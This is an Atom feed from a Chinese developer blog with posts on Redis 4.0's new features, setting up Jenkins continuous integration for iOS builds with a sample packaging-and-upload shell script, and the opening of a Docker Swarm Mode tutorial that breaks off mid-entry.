<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2016-12-09T03:13:36.828Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>五分钟了解Redis4.0新特性</title>
    <link href="https://t1ger.github.io/2016/12/09/%E4%BA%94%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3Redis4-0%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <id>https://t1ger.github.io/2016/12/09/五分钟了解Redis4-0新特性/</id>
    <published>2016-12-09T03:05:05.000Z</published>
    <updated>2016-12-09T03:13:36.828Z</updated>
    
    <content type="html"><![CDATA[<p>看到redis版本变成4.0，好多同学可能会有疑惑，咋的从3.x直接就跳到4.0了么，这里引用antirez大神的博客来说明原因：<br>Redis 4.0 is not called 3.4 because it is a major release that adds a number<br>of important and non trivial features. Many core functionalities of Redis were<br>seriously reworked.</p>
<p>这段话大意是说，新版本的 Redis 出现了多项改变， 所以他决定从原来的 3.x 版本直接跳到 4.0 版本， 以此来强调这次更新的变化之大</p>
<p>闲言少续，我们来看看到底有哪些变化呢</p>
<ul>
<li>Redis modules system<br>Redis允许开发者开发modules去扩展Redis功能，这样开发者可以使用新的数据类型，Module api 与Redis内核完全分离，互不干扰</li>
<li>Partial Replication (PSYNC) version 2<br>Redis解决了旧版本从服务器重启，必须与主服务器重新进行全量复制，在新版中，只要条件允许，主从在处理这种情况时将使用部分复制<br>Redis解决了从服务器在failover后成为新的主节点，在旧版中其他从节点在复制这个新主的时候就必须进行全量复制，新版中将在条件允许的情况下使用部分复制</li>
<li>Cache eviction improvements<br>添加了Last Frequently Used 缓存驱逐策略，对已有的缓存策略进行了优化。</li>
<li><p>Lazy freeing of keys<br>在旧版中，使用del、flushdb、flushall删除包含体积较大的键，都可能造成服务器阻塞<br>新版中，增加ulink命令，是del命令的异步版本，将删除制动键的曹组放在后台线程执行，尽可能避免服务器阻塞<br>由于历史原因，del将会继续保留，flushdb和flushall命令都新添加了async选项，带这个选项的数据库删除都将在后台线程进行</p>
</li>
<li><p>Mixed RDB-AOF format<br>在开启了这个功能之后， AOF 重写产生的文件将同时包含 RDB 格式的内容和 AOF 格式的内容， 其中 RDB 格式的内容用于记录已有的数据， 而 AOF 格式的内存则用于记录最近发生了变化的数据， 这样 Redis 就可以同时兼有 RDB 持久化和 AOF 持久化的优点 —— 既能够快速地生成重写文件， 也能够在出现问题时， 快速地载入数据</p>
</li>
<li><p>A new MEMORY command<br>命令可以用于视察内存使用情况， 并进行相应的内存管理操作<br>redis&gt; MEMORY HELP<br>1) “MEMORY USAGE <key> [SAMPLES <count>] - Estimate memory usage of key”<br>2) “MEMORY STATS                         - Show memory usage details”<br>3) “MEMORY PURGE                         - Ask the allocator to release memory”<br>4) “MEMORY MALLOC-STATS                  - Show allocator internal stats”<br>redis&gt; SET msg “hello world”<br>OK<br>redis&gt; SADD fruits apple banana cherry<br>(integer) 3<br>redis&gt; MEMORY USAGE msg<br>(integer) 62<br>redis&gt; MEMORY USAGE fruits<br>(integer) 375</count></key></p>
</li>
<li><p>Redis Cluster support for NAT / Docker. There are new functionalities in order to force cluster instances to announce specific sets of IP address, client and bus ports, to the rest of the cluster, regardless of the auto detected IP. This required a bus protocol change that will force users to mass-restart all the nodes of a Redis 3.2 installation in order to upgrade to 4.0</p>
</li>
<li><p>Redis uses now less memory in order to store the same amount of data</p>
</li>
</ul>
<p>这里基本都是比较大的特性了，还有些小惊喜等着你哦</p>
<ul>
<li><p>Improvements to the RDB format to support 64 bit lengths, binary sorted set scores, and more.The RDB file check utility now uses the same code base of the one used by Redis itself in order to load the RDB file in memory.</p>
</li>
<li><p>SWAPDB command: ability to completely and immediately (no latency) replace two Redis databases.<br>可以对指定的两个数据库进行互换： 比如说， 通过执行命令 SWAPDB 0 1 ， 我们可以将原来的数据库 0 变成数据库 1 ， 而原来的数据库 1 则变成数据库 0</p>
</li>
<li><p>Improvements to <code>dict.c</code>, the Redis hash table implementation.</p>
</li>
<li><p>Security improvements mapping POST and Host: commands to QUIT in order to prevent cross protocol scripting attacks.</p>
</li>
<li><p>RPUSHX and LPUSHX now accept a variable number of elements.</p>
</li>
<li><p>Reporting of additional memory used by copy on write in the INFO output.</p>
</li>
<li><p>Serious refactoring of many core parts of Redis.</p>
</li>
</ul>
<p>ref</p>
<p><a href="https://raw.githubusercontent.com/antirez/redis/4.0/00-RELEASENOTES" target="_blank" rel="external">Redis 4.0 release notes</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看到redis版本变成4.0，好多同学可能会有疑惑，咋的从3.x直接就跳到4.0了么，这里引用antirez大神的博客来说明原因：&lt;br&gt;Redis 4.0 is not called 3.4 because it is a major release that adds 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Jenkins构建iOS持续集成环境</title>
    <link href="https://t1ger.github.io/2016/12/05/Jenkins%E6%9E%84%E5%BB%BAiOS%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83/"/>
    <id>https://t1ger.github.io/2016/12/05/Jenkins构建iOS持续集成环境/</id>
    <published>2016-12-05T03:55:23.000Z</published>
    <updated>2016-12-06T14:56:14.826Z</updated>
    
    <content type="html"><![CDATA[<h5 id="关于持续集成"><a href="#关于持续集成" class="headerlink" title="关于持续集成"></a><b>关于持续集成</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">持续集成是一种软件开发实践,通过每个成员每天至少集成一次，也就意味着每天可能会发生多次集成</div><div class="line">每次集成都通过自动化的构建（包括编译，发布，自动化测试）来验证，从而尽早地发现集成错误</div></pre></td></tr></table></figure>
<p>常用的持续集成工具</p>
<ul>
<li><a href="http://jenkins-ci.org/" target="_blank" rel="external">Jenkins CI</a></li>
<li><a href="https://travis-ci.com/" target="_blank" rel="external">Travis CI</a></li>
<li><a href="http://hudson-ci.org/" target="_blank" rel="external">Hudson CI</a></li>
<li><a href="https://circleci.com/" target="_blank" rel="external">Circle CI</a></li>
</ul>
<p>这里我们选择的是jenkins，好吧，安装就不多说了，不了解的同学请移步<a href="https://jenkins.io/doc/book/getting-started/installing/" target="_blank" rel="external">这里</a></p>
<h5 id="前置说明"><a href="#前置说明" class="headerlink" title="前置说明"></a><b>前置说明</b></h5><ul>
<li>实现 iOS 项目自动打包，需要有 Mac OSX 环境，Mac OSX 需要安装 Xcode ，并且系统中安装有 Xcode 的命令行工具</li>
<li>iOS 项目使用 CocoaPods 进行依赖管理，故 Mac OSX 需要安装 CocoaPods</li>
<li>确保 Jenkins 服务器所在的机器上拥有对应的证书和 Profile 文件(用Xcode必选)</li>
<li>如果需要静态扫描，可以安装Scan-build，用于静态扫描，请参考<a href="http://clang-analyzer.llvm.org/scan-build.html" target="_blank" rel="external">这里</a></li>
<li>安装xtool,用于单元测试，具体参见<a href="https://github.com/facebook/xctool" target="_blank" rel="external">这里</a>(可选)</li>
</ul>
<h5 id="Jenkins的配置"><a href="#Jenkins的配置" class="headerlink" title="Jenkins的配置"></a><b>Jenkins的配置</b></h5><ul>
<li>如果是git管理代码，需要安装git插件<br>如果是svn管理代码，需要安装Subversion Plug-in插件</li>
<li>安装Xcode插件(可选，如使用 Fir.im 的 CLI 可不需要安装 Xcode integration)<br>选择系统管理-&gt;管理插件，在“可选插件”中选中“Xcode integration”安装</li>
<li>安装签名证书管理插件(可选)<br>iOS打包内测版时，需要发布证书及相关签名文件，因此这两个插件对于管理iOS证书非常方便。<br>在系统管理-&gt;管理插件，在“可选插件”中选中“Credentials Plugin”和“Keychains and Provisioning Profiles Management”安装</li>
<li>安装Post-Build脚本插件<br>系统管理-&gt;管理插件，在“可选插件”中选中“Post-Build Script Plug-in”安装</li>
<li>E-mail的设置<br>a. 首先要设置Jenkins的管理员邮箱，在Manage Jenkins-&gt;Configure System的“Jenkins Location”中设置“System Admin e-mail address”为需要的邮箱，也就是Jenkins发送邮件的发件人<br>b. 接下来设置邮件SMTP的相关信息，在“E-mail Notification”区域中，点击“Advanced…”按钮，然后进行设置，首先填写SMTP服务器地址，选中“Use SMTP Authentication”的复选框，然后输入用户名和密码，最后在“Test configuration by sending test e-mail”中输入一个测试邮箱来测试邮件是否能发送成功。如果成功，会有相关提示<br>备注：Jenkins管理员邮箱要与SMTP中设置的发送邮箱为同一个邮箱</li>
<li><p>Environment Injector Plugin<br>系统管理-&gt;系统设置中可以进行全局配置,可以设置Xcode Builder（钥匙串设置）<br>需要填写的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Keychain Name：iPhone Distribution:*(dis证书常用名)</div><div class="line">Keychain path：$&#123;HOME&#125;/Library/Keychains/login.keychain(dis证书路径)</div><div class="line">Keychain password：*</div><div class="line">Add to keychain search path after build：Yes</div><div class="line">Default keychain:iPhone Distribution:*</div></pre></td></tr></table></figure>
</li>
<li><p>安装FTP插件(可选)<br>系统管理-&gt;管理插件，在“可选插件”中选中“Publish over FTP”安装</p>
</li>
<li>description setter plugin：用于在修改Build描述信息，在描述信息中增加显示QRCode（二维码）(可选)</li>
<li>Gradle plugin Android专用（可选）</li>
<li>Html publisher plugin 用于展示HTML报表（可选）</li>
<li>JUnit plugin 用于展示JUnit xml报表（可选）</li>
</ul>
<h5 id="自动化构建"><a href="#自动化构建" class="headerlink" title="自动化构建"></a><b>自动化构建</b></h5><ul>
<li><p>准备工作<br>如果使用git，git仓库的ssh-key已经保存，描述文件和配置证书已经安装在机器上，证书已经设置为总是允许访问<br>在Jenkins中，所有的任务都是以“item”为单位的。接下来我们就新建一个iOS的项目来开始自动化构建。点击“新建”，输入item的名称，选择“构建一个自由风格的软件项目”，然后点击“OK”。<br>对于一个持续集成打包平台，每次打包都由4步组成：触发构建、拉取代码、执行构建、构建后处理。对应的，在每个Job中也对应了这几项的配置。<br>其中执行构建可细化为：Xcode clean、静态扫描、单元测试XCTest、编译、打包等</p>
</li>
<li><p>源码管理设置<br>a) 如果是svn:选择svn填好路径，第一次配置会要求输入账户密码，以后就会自动记住了.<br>Check-out Strategy最好选择每次update最新代码前都revert下，而不是“Use ‘svn update’ as much as possible” ，因为我使用的是cocoa pod管理的第三方，每次打包运行pod install会修改了工程配置文件，如果下次自动打包前不先revert再update的话会出现冲突<br>b) 如果是git: 填写git的仓库地址，认证账户，需要构建的分支等,这里有两种情况：<br>第一种如果Repository URL是HTTPS URL形式的，那么Credentials就要采用GitHub用户名密码的校验方式；而且，如果在GitHub中开启了2FA（two-factor authentication），那么还需要在GitHub中创建一个Personal access token，输入密码时将这个Personal access token作为密码进行输入<br>第二种如果Repository URL是SSH URL形式的，那么就需要先在Jenkins所在的服务器上创建一个SSH秘钥对，并将公钥添加到GitHub的SSH keys中，然后在填写Credentials时，选择SSH Username with private key的校验方式，填入GitHub Username、SSH私钥、以及创建SSH秘钥对时设置的Passphrase</p>
</li>
<li><p>触发条件设置<br>设置build的触发条件，由于是做Daily Build，所以在“Build Triggers”中，选择“Build periodically”，然后在输入框中输入build的规则，这里假设我们的规则是每个工作日的下午6点25到30分之间进行build，所以在输入框中输入“H(25-30) 18 <em> </em> 1-5”(点击输入框右边的问号，会有详细的规则编写说明)<br>jenkin支持多种类型，常用的有<br>a. 定期进行构建（Build periodically）<br>b. 根据提交进行构建(Build when a change is pushed to GitHub)<br>c. 定期检测代码更新，如有更新则进行构建(Poll SCM)</p>
</li>
<li><p>构建环境设置<br>如果使用Xcode,iOS打包需要签名文件和证书，所以这部分我们勾选“Keychains and Code Signing Identities”和“Mobile Provisioning Profiles”。<br>这里我们又需要用到Jenkins的插件，在系统管理页面，选择“Keychains and Provisioning Profiles Management”。<br>进入Keychains and Provisioning Profiles Management页面，点击“浏览”按钮，分别上传自己的keychain和证书。<br>上传成功后，我们再为keychain指明签名文件的名称。点击“Add Code Signing Identity”<br>我们的Adhoc证书和签名文件就已经在Jenkins中配置好了，接下来我们只需要在item设置中指定相关文件即可。<br>回到我们新建的item，找到构建环境,接下来就可以配置xcode了</p>
</li>
<li><p>编译设置<br>a. 如果有静态扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scan-build  -o [OUTPUT_PATH] xcodebuild -configuration Debug  -sdk iphonesimulator</div></pre></td></tr></table></figure>
<p>  静态扫描的结果为index.html，可以通过Html publisher plugin进行展示<br>b. 如果是采用Xcode integration插件进行构建，配置会比较复杂，需要在Jenkins中导入开发证书，并填写多个配置项<br>c. 如果是采用打包脚本进行构建的话，情况就会简单许多。只要在Jenkins所运行的计算机中安装好开发者证书，打包命令在Shell中能正常工作，那么在Jenkins中执行打包脚本也不会有什么问题<br>我们既可以使用Jenkins自带的xcode插件，也可以自己编写脚本来完成。编写脚本时，可以直接使用Xcode的xcodebuild来写，也可以使用Facebook提供的xctool来做<br>这里来介绍Xcode几个选项和附上shell脚本：</p>
<ul>
<li>Target：就是我们在项目中建立的Target，如果不清楚有哪些Target的情况下可以到xcodeproj或xcworkspace的目录下运行如下命令<br>xcodebuild -list  即可看到Targets，其中是所有可以用的target</li>
<li>Clean before build?:这个是在编译前是否clean一次，一般是选择YES。</li>
<li>Configuration: 对应的是xcodebuild命令里的-configuration的参数，可选项为[Debug、Release]，一般都填Debug，这样就可以将打包后的ipa交付给测试人员测试<br>Pack application and build .ipa?:这个是在结束是是否要产生对应的ipa文件，一般都是打上勾的</li>
<li>.ipa filename pattern:这个配置项是配置所产生ipa的文件名，其中有一些可用的全局变量<br>其中${VERSION}和${SVN_REVISION}都是可以直接用的环境变量，如果想看还有哪些环境变量而已用可以点击在Execute shell下方有个 “See the list of available environment variables”进行查看</li>
<li>Output directory:这个配置了ipa的输出目录(默认Build output directory所在路径)</li>
<li>如果使用脚本，仍然是点击“增加构建步骤”，选择“Execute Shell”<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">#&lt;-------------------------------------------------------&gt;  </div><div class="line"># 删除旧源码目录-&gt;新建源码目录-&gt;从svn导出最新代码-&gt;清理旧文件-&gt;清除旧项目-&gt;打包-&gt;上传  </div><div class="line">   </div><div class="line">pwd  </div><div class="line">   </div><div class="line"># 名称配置  </div><div class="line">checkout_name=&quot;checkout&quot;  </div><div class="line">project_name=&quot;Air&quot;  </div><div class="line"># 配置项目版本  </div><div class="line">#targetProject_sdk=&quot;iphoneos8.0&quot;  </div><div class="line">targetProject_destination=&quot;generic/platform=iOS&quot;  </div><div class="line">configuration=&quot;Release&quot;  </div><div class="line">scheme=&quot;$project_name&quot;  </div><div class="line">workspace_name=&quot;$&#123;project_name&#125;.xcworkspace&quot;  </div><div class="line"># 目录配置  </div><div class="line">save_path=&quot;/Users/xiaoming/Desktop/uploadIPA&quot;  </div><div class="line">archive_path=&quot;$save_path/$&#123;project_name&#125;.xcarchive&quot;  </div><div class="line">ipa_path=&quot;$save_path/$&#123;project_name&#125;.ipa&quot;  </div><div class="line">log_path=&quot;$save_path/log.txt&quot;  </div><div class="line"># svn配置  </div><div class="line">svn_path=&quot;http://192.168.1.110/svn/Air/trunk/iOS/Air&quot;  </div><div class="line">checkout_path=&quot;$save_path/$checkout_name&quot;  </div><div class="line">svn_name=&quot;xiaoming&quot;  </div><div class="line">svn_password=&quot;123456&quot;  </div><div class="line"># 配置签名证书、描述文件  </div><div class="line">codeSignIdentity=&quot;iPhoneDeveloper: xiaoming zh (5AB779CDEF)&quot;  </div><div class="line">provision_UUID=&quot;06a7492b-083c-4313-d633-15ef685929g4&quot;  </div><div class="line">provisoning_profile=&quot;AirDevelopProfile&quot;  </div><div class="line"># 配置蒲公英  </div><div class="line">upload_path=&quot;$save_path/$&#123;project_name&#125;.ipa&quot;  </div><div class="line">pgy_userKey=&quot;a512b58c56285d23456e011fgh706509&quot;  </div><div class="line">pgy_apiKey=&quot;ab9c240d2efg9hi17j9642k3l5mnop5q&quot;  </div><div class="line">   </div><div class="line">echo &quot;正在删除旧源码&quot;  </div><div class="line"># 删除旧源码目录  </div><div class="line">[ -e $checkout_path ]&amp;&amp;rm -rf &quot;$checkout_path&quot; &gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在创建新的源码目录&quot;  </div><div class="line"># 新建源码目录  </div><div class="line">cd &quot;$save_path&quot;&gt;&gt; $log_path  </div><div class="line">pwd  </div><div class="line">mkdir &quot;$checkout_name&quot; &gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在从svn下载最新的源码&quot;  </div><div class="line"># 从svn导出最新代码  </div><div class="line">svn checkout &quot;$svn_path&quot; &quot;$checkout_path&quot; --username&quot;$svn_name&quot; --password &quot;$svn_password&quot; &gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在删除旧文件&quot;  </div><div class="line"># 删除旧文件  </div><div class="line">[ -e $log_path ]&amp;&amp;rm -rf &quot;$log_path&quot; &gt;&gt; $log_path  </div><div class="line">[ -e $archive_path ]&amp;&amp;rm -rf &quot;$archive_path&quot; &gt;&gt; $log_path  </div><div class="line">[ -e $ipa_path ]&amp;&amp;rm -rf &quot;$ipa_path&quot; &gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在清除构建项目缓存&quot;  </div><div class="line"># 重要，执行xcodebuild命令时，必须进入项目目录  </div><div class="line">cd &quot;$checkout_path&quot; &gt;&gt; $log_path  </div><div class="line">pwd  </div><div class="line"># 清理构建目录  </div><div class="line">xcodebuild clean-configuration &quot;$configuration&quot; -alltargets &gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在打包&quot;  </div><div class="line"># 归档（其他参数不指定的话，默认用的是.xcworkspace或.xcodeproj文件里的配置）  </div><div class="line">xcodebuild archive -workspace&quot;$workspace_name&quot; -scheme &quot;$scheme&quot; -destination&quot;$targetProject_destination&quot; -configuration&quot;$configuration&quot; -archivePath &quot;$archive_path&quot;CODE_SIGN_IDENTITY=&quot;$codeSignIdentity&quot; PROVISIONING_PROFILE=&quot;$provision_UUID&quot;&gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在导出ipa包&quot;  </div><div class="line"># 导出IPA  </div><div class="line">xcodebuild -exportArchive-exportFormat IPA -archivePath &quot;$archive_path&quot; -exportPath&quot;$ipa_path&quot; -exportProvisioningProfile&quot;$provisoning_profile&quot; &gt;&gt; $log_path  </div><div class="line">   </div><div class="line">echo &quot;正在上传ipa到蒲公英&quot;  </div><div class="line"># 上传IPA到蒲公英  </div><div class="line">curl -F&quot;file=@$upload_path&quot; -F &quot;uKey=$pgy_userKey&quot; -F &quot;_api_key=$pgy_apiKey&quot;https://www.pgyer.com/apiv1/app/upload </div><div class="line">#&lt;-------------------------------------------------------&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>编译后行为设置<br>工程成功编译以后，我们可以设置编译出来的ipa文件(甚至可以直接是ota文件),将其与本次build的相关结果放到一起，提供下载。也可以在build失败时，发送邮件提醒。设置如下:点击“Add post-build action”选择“Archive the artifacts”，在输入框中输入“build/*.ipa”，就可以将编译打包后的ipa文件集成。点击“Add post-build action”选择“E-mail Notification”，在输入框中输入编译失败后邮件的通知者邮箱，如有多个，以空白字符分隔<br>当iOS应用打包好后，我们还想发给其他相关人员安装，包括公司内部的，外网的，都需要。这时我们还需配置OTA服务和内网FTP<br>外网安装App我们需要用到现在市面上比较流行的免费平台,<a href="https://www.pgyer.com/" target="_blank" rel="external">蒲公英</a> 在蒲公英官网设置相关信息后，我们可以写一个简单的脚本，来实现App打包后，上传到蒲公英和公司内网以及邮件提醒相关人员这一系列操作<br>如果用Jenkins的插件配置FTP信息，进入系统管理页面，选择系统设置，找到“Publish over FTP”，填写信息后回到任务配置页面，点击“增加构建后操作步骤”，然后选择“Send build artifacts over FTP”，在填写信息后我们再点击“增加构建后操作步骤”，选择“Execute a set of scripts，执行相关脚本即可</p>
</li>
</ul>
<ul>
<li><p>单元测试<br>a. 如果使用XCTool</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">XCTOOL_PATH  -workspace [YourProject&apos;s workspace] -scheme [YourSheme] -configuration Debug  -sdk iphonesimulator -launch-timeout 500 -reporter junit: [path/output.xml] test</div><div class="line">注意我们输出报表的格式为JUnit xml；</div></pre></td></tr></table></figure>
<p>  b. 如果选择xcode自带的XCTest框架（Xcode5之前叫做OCUnit）。创建单元测试Job和自动化构建的Job过程一样，只在触发构建规则，build的脚本和编译后的规则有些不同<br>单元测试的触发规则应该在git仓库的每次有新提交时就触发执行，所以在”Build Triggers”中，选择“Poll SCM”，在规则中写入“H/10 <em> </em> <em> </em>”，意思是每十分钟轮询一次远程仓库，如果有新的提交，则开始构建。可以根据自己需求来设置轮询的时间间隔<br>接下来是在build中输入单元测试脚本。这里需要有一些准备<br>首先，由于Jenkins只接收Junit的单元测试报告，这里要安装一个将脚本执行结果的ocunit格式的测试报告转化为JUnit报告格式的脚本，该项目名叫OCUnit2JUnit<br>需要在当前项目工程中，将项目schemes共享，并上传到远程仓库。在工程中选择“Manage Schemes”在弹出的菜单中勾选“Shared”，然后在git中将相应的shared shceme添加到版本控制中并上传到远程仓库<br>Build”配置中，依然选择“Execute shell”，shell的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xcodebuild test -scheme testCI -sdk iphonesimulator7.0 -destination OS=7.0,name=&quot;iPhone Retina (4-inch)&quot; -configuration Debug  2&gt;&amp;1 | ocunit2junit</div></pre></td></tr></table></figure>
<p>  这里的单元测试是在模拟器中进行，如果测试服务器连接着iOS设备，也可以设置在iOS设备中进行，只需修改上述shell的参数即可。<br>最后是编译后行为的设置，这里要将测试报告加入。点击“Add post-build action”选择“Publish JUnit test result report”，输入内容test-reports/*.xml保存设置<br>接下来在单元测试的Job中，点击“Build Now”来测试一下Job的配置，如果配置正确，则会看到模拟器启动，然后运行了一下程序，之后在build的结果里，可以看到相应的测试报告</p>
</li>
</ul>
<h5 id="可能遇到的坑"><a href="#可能遇到的坑" class="headerlink" title="可能遇到的坑"></a><b>可能遇到的坑</b></h5><ul>
<li>使用jenkins server进行持续集成时会遇到模拟器无法启动的问题<br>使用jenkins server进行持续集成时会遇到模拟器无法启动的问题，因此需要将jenkins模式从LaunchDaemon移到LaunchAgent。具体参见<a href="http://pivotallabs.com/ios-ci-jenkins/" target="_blank" rel="external">这里</a><br>另外，将CreateSession从org.jenkins-ci.plist中移除,参考<a href="http://staxmanade.com/2015/01/setting-jenkins-up-to-run-xctool-and-xcode-simulator-tests/" target="_blank" rel="external">这里</a></li>
</ul>
<p>ref<br><a href="http://stackoverflow.com/questions/32504355/error-itms-90339-this-bundle-is-invalid-the-info-plist-contains-an-invalid-ke/32762413#32762413" target="_blank" rel="external">Jenkins 打包生成 ipa</a><br><a href="http://blog.csdn.net/lsgeek/article/details/48130343" target="_blank" rel="external">Jenkins构建iOS持续集成环境</a><br><a href="http://www.jianshu.com/p/c69deb29720d" target="_blank" rel="external">一步一步构建iOS持续集成:Jenkins+GitLab+蒲公英+FTP</a><br><a href="http://blog.csdn.net/gaowenhui2008/article/details/52238462" target="_blank" rel="external">使用Jenkins搭建iOS/Android持续集成打包平台</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;关于持续集成&quot;&gt;&lt;a href=&quot;#关于持续集成&quot; class=&quot;headerlink&quot; title=&quot;关于持续集成&quot;&gt;&lt;/a&gt;&lt;b&gt;关于持续集成&lt;/b&gt;&lt;/h5&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker 1.12 Swarm Mode初体验</title>
    <link href="https://t1ger.github.io/2016/12/01/Docker-1-12-Swarm-Mode%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://t1ger.github.io/2016/12/01/Docker-1-12-Swarm-Mode初体验/</id>
    <published>2016-12-01T02:40:08.000Z</published>
    <updated>2016-12-07T02:02:24.607Z</updated>
    
    <content type="html"><![CDATA[<h5 id="Swarm-Mode是什么"><a href="#Swarm-Mode是什么" class="headerlink" title="Swarm Mode是什么"></a><b>Swarm Mode是什么</b></h5><p>Swarm Mode 直接集成于 docker engine 内部, 提供了原生的集群支持, 但与单机版 docker engine 并不兼容, 使用独立的 docker service 命令进行管理, 也无法使用单机版 Docker 的工具及 API,下面介绍几个基本概念</p>
<ul>
<li>节点(node)为Swarm集群中的一个docker engine实例。其中管理节点(manager node)负责swarm集群管理并向工作节点分配任务；工作节点(work node)接受并执行来自管理节点的task</li>
<li>服务(service)是对在worker nodes所运行一组任务的定义，它是整个swarm的核心，一个service由多个任务组成</li>
<li>任务(task)包含Docker容器和容器中运行的命令或应用，它是swarm中被调度的最小单元。简单可理解为一个task就是一个容器</li>
</ul>
<p>Swarm Mode下主要使用三组新的命令行工具创建和管理一个Swarm集群</p>
<ul>
<li>docker swarm:集群管理，子命令有init, join, leave, update</li>
<li>docker node: 节点管理，子命令有accept, promote, demote, inspect, update, tasks, ls, rm</li>
<li>docker service: 服务创建，子命令有create, inspect, update, remove, tasks</li>
<li>docker stack/deploy：试验特性，用于多应用部署， 类似与 docker-compose 中的特性</li>
</ul>
<h5 id="Swarm-Mode特性"><a href="#Swarm-Mode特性" class="headerlink" title="Swarm Mode特性"></a><b>Swarm Mode特性</b></h5><ul>
<li>去中心化设计</li>
<li>声明式服务模型</li>
<li>随意控制集群规模</li>
<li>自动状态维护</li>
<li>跨主机网络</li>
<li>服务发现</li>
<li>负载均衡</li>
<li>默认tls加密</li>
<li>滚动更新</li>
</ul>
<h5 id="创建Swarm集群"><a href="#创建Swarm集群" class="headerlink" title="创建Swarm集群"></a><b>创建Swarm集群</b></h5><ul>
<li><p>准备工作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># rpm -ivh epel-release-7-2.noarch.rpm </div><div class="line"># cat /etc/yum.repos.d/docker.repo </div><div class="line">[dockerrepo]</div><div class="line">name=Docker Repository</div><div class="line">baseurl=https://yum.dockerproject.org/repo/main/centos/$releasever/</div><div class="line">enabled=1</div><div class="line">gpgcheck=1</div><div class="line">gpgkey=https://yum.dockerproject.org/gpg</div><div class="line"> </div><div class="line"># yum install docker-engine -y</div><div class="line"># systemctl start docker</div><div class="line"># systemctl enable docker</div><div class="line"># docker version</div></pre></td></tr></table></figure>
</li>
<li><p>在node01上初始化swarm集群</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># docker swarm init --advertise-addr 192.168.1.102</div><div class="line">Swarm initialized: current node (1r64t4ljem9e4l2e8pnxx9p5o) is now a manager.</div><div class="line"></div><div class="line">To add a worker to this swarm, run the following command:</div><div class="line"></div><div class="line">docker swarm join \</div><div class="line">--token SWMTKN-1-457lrm2xagck8zy5ce9njycvybj9fsurgsh71ihhotol4ivtmj-ds0l8ld19esrbev349v6r4hd1 \</div><div class="line">192.168.1.102:2377</div><div 